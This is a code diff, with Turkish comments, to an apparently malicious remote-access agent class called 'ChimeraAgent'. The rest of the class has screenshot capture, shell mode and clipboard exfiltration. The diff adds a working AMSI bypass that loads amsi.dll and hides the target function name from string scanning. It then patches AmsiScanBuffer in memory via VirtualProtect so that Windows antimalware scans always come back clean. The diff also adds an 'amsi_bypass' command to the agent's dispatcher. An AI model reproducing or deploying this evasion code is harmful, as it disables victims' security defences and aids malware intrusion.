@@ -1258,6 +1258,87 @@ class ChimeraAgent:
         return "[!] Screenshot alınamadı. Lütfen 'pip install mss' veya 'pip install Pillow' kurun."
 
     # --------------------------------------------------------
+    # Evasion (Atlatma) Teknikleri
+    # --------------------------------------------------------
+    def bypass_amsi(self) -> str:
+        """AMSI (Antimalware Scan Interface) korumasını devre dışı bırakır (Windows).
+        
+        Bellekteki amsi.dll içerisindeki AmsiScanBuffer fonksiyonunun başlangıcını
+        patchleyerek her zaman temiz sonuç dönmesini sağlar.
+        
+        Returns:
+            str: İşlem sonucu
+        """
+        if sys.platform != "win32":
+            return "[!] AMSI Bypass sadece Windows sistemlerde geçerlidir."
+            
+        try:
+            import ctypes
+            from ctypes import wintypes
+            
+            kernel32 = ctypes.windll.kernel32
+            
+            # Gerekli DLL'i yükle (Zaten yüklü olabilir ama garanti olsun)
+            # LoadLibraryA yerine LoadLibraryW unicode için daha güvenli
+            h_amsi = kernel32.LoadLibraryW("amsi.dll")
+            if not h_amsi:
+                return "[!] amsi.dll yüklenemedi (Sistemde AMSI olmayabilir)."
+                
+            # AmsiScanBuffer adresini bul
+            get_proc_address = kernel32.GetProcAddress
+            get_proc_address.argtypes = [wintypes.HMODULE, ctypes.c_char_p]
+            get_proc_address.restype = ctypes.c_void_p
+            
+            # Obfuscation: Fonksiyon adını parça parça birleştir (String taramasından kaçmak için)
+            func_name = b"Amsi" + b"Scan" + b"Buffer"
+            amsi_scan_buffer_addr = get_proc_address(h_amsi, func_name)
+            
+            if not amsi_scan_buffer_addr:
+                return "[!] AmsiScanBuffer adresi bulunamadı."
+                
+            # Mimariye uygun patch hazırla
+            if struct.calcsize("P") * 8 == 64:
+                # x64 Patch
+                # mov eax, 0x80070057 (E_INVALIDARG)
+                # ret
+                patch = b"\\xB8\\x57\\x00\\x07\\x80\\xC3"
+            else:
+                # x86 Patch
+                # mov eax, 0x80070057
+                # ret 0x18 (Argümanları temizle - Stdcall)
+                patch = b"\\xB8\\x57\\x00\\x07\\x80\\xC2\\x18\\x00"
+                
+            # Bellek korumasını değiştir (RWX yap)
+            # PAGE_EXECUTE_READWRITE = 0x40
+            old_protect = ctypes.c_ulong()
+            
+            # VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
+            if not kernel32.VirtualProtect(
+                ctypes.c_void_p(amsi_scan_buffer_addr), 
+                len(patch), 
+                0x40, 
+                ctypes.byref(old_protect)
+            ):
+                return f"[!] Bellek izni değiştirilemedi. Hata Kodu: {kernel32.GetLastError()}"
+            
+            # Patch'i uygula (memmove veya pointer ile yazma)
+            # ctypes.memmove daha güvenilir
+            ctypes.memmove(ctypes.c_void_p(amsi_scan_buffer_addr), patch, len(patch))
+            
+            # Bellek korumasını eski haline getir
+            kernel32.VirtualProtect(
+                ctypes.c_void_p(amsi_scan_buffer_addr), 
+                len(patch), 
+                old_protect, 
+                ctypes.byref(old_protect)
+            )
+            
+            return f"[+] AMSI Bypass başarıyla uygulandı! (Adres: {hex(amsi_scan_buffer_addr)})"
+            
+        except Exception as e:
+            return f"[!] AMSI Bypass hatası: {str(e)}"
+
+    # --------------------------------------------------------
     # Komut Çalıştırma
     # --------------------------------------------------------
     def shell_mode(self):
@@ -1411,6 +1492,9 @@ class ChimeraAgent:
             # (Özel karakterler veya newlinelar protokolü bozmasın diye)
             b64_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
             return f"CLIPBOARD_DATA:{b64_content}"
+            
+        if cmd_lower == "amsi_bypass":
+            return self.bypass_amsi()
             
         if cmd_lower.startswith("clipboard_set "):
             try:
